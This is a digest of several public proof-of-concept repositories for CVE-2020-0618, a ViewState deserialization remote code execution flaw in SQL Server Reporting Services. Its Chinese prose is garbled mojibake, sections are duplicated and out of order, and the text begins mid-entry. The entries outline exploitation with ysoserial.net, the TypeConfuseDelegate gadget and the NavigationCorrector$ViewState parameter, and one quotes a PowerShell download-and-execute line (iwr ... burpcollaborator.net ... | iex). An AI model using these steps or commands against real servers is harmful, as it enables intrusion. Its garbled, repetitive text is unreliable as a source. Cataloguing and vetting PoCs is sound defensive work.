**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

